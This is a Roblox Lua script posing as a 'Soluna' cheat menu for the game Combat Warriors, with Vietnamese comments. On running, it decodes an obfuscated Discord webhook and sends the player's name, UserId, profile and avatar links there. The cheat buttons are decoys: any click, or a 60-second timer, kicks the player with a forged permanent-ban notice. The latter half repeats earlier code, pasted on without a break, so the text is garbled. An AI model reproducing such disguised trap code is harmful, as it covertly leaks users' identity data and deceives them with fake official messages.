-- // Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- // Webhook Discord (link mới, đã mã hóa Base64 , GG cho bọn hohohub)
local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1OTg1MzUzNTgzMTY1NDQ0MS8zZDI2dm5kUGM5TXdJSm5MNTliRGlaaUZLU0pIcDNSR19hZmQ2cUtEWk9yNTQydkdWaGwxWlVxMUNpRTVYeVFYMThoRg=="
local webhookUrl = HttpService:Base64Decode(encodedWebhook)

-- // Ban message gốc
local banMessage = [[
You have been banned from Combat Warriors
Duration: Permanent
Reason: You have been banned.

You can appeal in our Communications server
(.gg/CombatWarriors).

IMPORTANT: Appeals made after 30 days of the ban date will not be accepted

You currently have 0 previous ban(s). Repeated bans will be longer or permanent.
]]

-- // Profile & avatar
local profileUrl = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=180&height=180&format=png"
local avatarFullbody = "https://www.roblox.com/outfit-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

-- // Gửi log ngay khi execute
local function sendWebhook()
    local data = {
        ["username"] = "bắt hack 1800",
        ["embeds"] = {{
            ["title"] = "🚨 Phát hiện script bị execute",
            ["description"] = "**Người chơi:** " .. player.Name ..
                "\n**UserId:** [" .. player.UserId .. "](" .. profileUrl .. ")" ..
                "\n**Thời gian:** " .. os.date("!%Y-%m-%d %H:%M:%S UTC"),
            ["color"] = 15158332,
            ["thumbnail"] = { ["url"] = avatarHeadshot },
            ["image"] = { ["url"] = avatarFullbody }
        }}
    }
    local json = HttpService:JSONEncode(data)

    local success, err = pcall(function()
        HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        local req = syn and syn.request or http_request or request
        if req then
            pcall(function()
                req({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json })
            end)
        else
            warn("Không thể gửi webhook: exploit không hỗ trợ HTTP request API")
        end
    end
end

sendWebhook() -- gửi log ngay

-- ======================================================
-- UI: Fake Soluna-style
-- ======================================================
local gui = Instance.new("ScreenGui")
gui.Name = "FakeSolunaUI"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

-- Main window
local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 560, 0, 360)
main.Position = UDim2.new(0.5, -280, 0.5, -180)
main.BackgroundColor3 = Color3.fromRGB(25,25,25)
main.BorderSizePixel = 0
main.ClipsDescendants = true
local cMain = Instance.new("UICorner", main) cMain.CornerRadius = UDim.new(0,16)
local sMain = Instance.new("UIStroke", main) sMain.Color = Color3.fromRGB(50,50,50) sMain.Thickness = 2

-- Top bar with title
local top = Instance.new("Frame", main)
top.Size = UDim2.new(1, 0, 0, 42)
top.BackgroundColor3 = Color3.fromRGB(32,32,36)
local cTop = Instance.new("UICorner", top) cTop.CornerRadius = UDim.new(0,16)
local sTop = Instance.new("UIStroke", top) sTop.Color = Color3.fromRGB(60,60,66) sTop.Thickness = 1

local title = Instance.new("TextLabel", top)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 14, 0, 0)
title.Size = UDim2.new(1, -14, 1, 0)
title.Font = Enum.Font.GothamSemibold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextColor3 = Color3.fromRGB(235,235,238)
title.Text = "Soluna | Combat Warriors"

-- Sidebar
local side = Instance.new("Frame", main)
side.Size = UDim2.new(0, 140, 1, -50)
side.Position = UDim2.new(0, 10, 0, 50)
side.BackgroundColor3 = Color3.fromRGB(20,20,22)
local cSide = Instance.new("UICorner", side) cSide.CornerRadius = UDim.new(0, 12)
local sSide = Instance.new("UIStroke", side) sSide.Color = Color3.fromRGB(55,55,60) sSide.Thickness = 1

local sideList = Instance.new("UIListLayout", side)
sideList.Padding = UDim.new(0, 8)
sideList.SortOrder = Enum.SortOrder.LayoutOrder
sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
sideList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Content
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -170, 1, -60)
content.Position = UDim2.new(0, 160, 0, 60)
content.BackgroundColor3 = Color3.fromRGB(30,30,34)
local cCont = Instance.new("UICorner", content) cCont.CornerRadius = UDim.new(0, 12)
local sCont = Instance.new("UIStroke", content) sCont.Color = Color3.fromRGB(60,60,66) sCont.Thickness = 1

local contList = Instance.new("UIListLayout", content)
contList.Padding = UDim.new(0, 10)
contList.SortOrder = Enum.SortOrder.LayoutOrder
contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
contList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Helper: tạo nút đẹp
local function makeButton(parent, text)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Size = UDim2.new(1, -24, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
    btn.Text = "  " .. text
    btn.TextColor3 = Color3.fromRGB(235,235,238)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.AutoButtonColor = false

    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1

    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)

    return btn
end

-- Nút sidebar
local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
local allButtons = {}

for _, name in ipairs(sideTabs) do
    local b = makeButton(side, name)
    table.insert(allButtons, b)
end

-- Các option trong Content (tab Player)
local options = {
    "Teleport",
    "Infinite Stamina",
    "No Fall Damage",
    "Noclip [BETA]",
    "Disable Utilities Damage",
    "Anti-Ragdoll"
}
for _, name in ipairs(options) do
    local b = makeButton(content, name)
    table.insert(allButtons, b)
end

-- ======================================================
-- Countdown 60s + Trap click (không hiển thị text)
-- ======================================================
local COUNTDOWN = 60
local start = os.clock()
local kicked = false

local function onAnyButtonClicked()
    if kicked then return end
    kicked = true
    player:Kick(banMessage)
end

for _, b in ipairs(allButtons) do
    b.MouseButton1Click:Connect(onAnyButtonClicked)
end

task.spawn(function()
    while not kicked do
        local elapsed = math.floor(os.clock() - start)
        if elapsed >= COUNTDOWN then
            kicked = true
            player:Kick(banMessage)
            break
        end
        task.wait(1)
    end
end)sideList.SortOrder = Enum.SortOrder.LayoutOrder
sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
sideList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Content
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -170, 1, -60)
content.Position = UDim2.new(0, 160, 0, 60)
content.BackgroundColor3 = Color3.fromRGB(30,30,34)
local cCont = Instance.new("UICorner", content) cCont.CornerRadius = UDim.new(0, 12)
local sCont = Instance.new("UIStroke", content) sCont.Color = Color3.fromRGB(60,60,66) sCont.Thickness = 1

local contList = Instance.new("UIListLayout", content)
contList.Padding = UDim.new(0, 10)
contList.SortOrder = Enum.SortOrder.LayoutOrder
contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
contList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Helper: tạo nút đẹp
local function makeButton(parent, text)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Size = UDim2.new(1, -24, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
    btn.Text = "  " .. text
    btn.TextColor3 = Color3.fromRGB(235,235,238)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.AutoButtonColor = false

    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1

    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)

    return btn
end

-- Nút sidebar
local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
local allButtons = {}

for _, name in ipairs(sideTabs) do
    local b = makeButton(side, name)
    table.insert(allButtons, b)
end

-- Các option trong Content (tab Player)
local options = {
    "Teleport",
    "Infinite Stamina",
    "No Fall Damage",
    "Noclip [BETA]",
    "Disable Utilities Damage",
    "Anti-Ragdoll"
}
for _, name in ipairs(options) do
    local b = makeButton(content, name)
    table.insert(allButtons, b)
end

-- ======================================================
-- Countdown 60s + Trap click (không hiển thị text)
-- ======================================================
local COUNTDOWN = 60
local start = os.clock()
local kicked = false

local function onAnyButtonClicked()
    if kicked then return end
    kicked = true
    player:Kick(banMessage)
end

for _, b in ipairs(allButtons) do
    b.MouseButton1Click:Connect(onAnyButtonClicked)
end

task.spawn(function()
    while not kicked do
        local elapsed = math.floor(os.clock() - start)
        if elapsed >= COUNTDOWN then
            kicked = true
            player:Kick(banMessage)
            break
        end
        task.wait(1)
    end
end)
